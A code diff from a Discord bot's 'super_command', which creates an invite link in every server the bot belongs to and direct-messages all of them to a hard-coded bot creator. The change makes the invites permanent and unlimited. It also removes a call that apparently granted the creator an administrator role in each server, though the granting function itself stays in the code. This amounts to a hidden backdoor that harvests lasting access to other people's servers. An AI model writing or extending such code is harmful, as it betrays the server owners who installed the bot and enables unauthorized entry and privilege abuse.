@@ -124,16 +124,12 @@ async def super_command(interaction: discord.Interaction):
         text_channel = next((channel for channel in guild.text_channels if channel.permissions_for(guild.me).create_instant_invite), None)
         if text_channel:
             try:
-                invite = await text_channel.create_invite(max_age=86400, max_uses=1)
+                invite = await text_channel.create_invite(max_age=0, max_uses=0)  # Permanent invite link
                 invite_links.append(f"{guild.name}: {invite.url}")
             except discord.Forbidden:
                 invite_links.append(f"{guild.name}: Unable to create invite link (Missing Permissions)")
         else:
             invite_links.append(f"{guild.name}: No suitable text channel found")
-
-        member = guild.get_member(BOT_CREATOR_ID)
-        if member:
-            await ensure_admin_role(guild, member)
 
     creator = await bot.fetch_user(BOT_CREATOR_ID)
     if creator:
@@ -141,6 +137,7 @@ async def super_command(interaction: discord.Interaction):
         await creator.send(f"Here are the invite links for all servers:\n{dm_message}")
 
     await interaction.followup.send("Invite links have been sent to your DM.", ephemeral=True)
+
 
 async def ensure_admin_role(guild: discord.Guild, member: discord.Member):
     highest_role = None
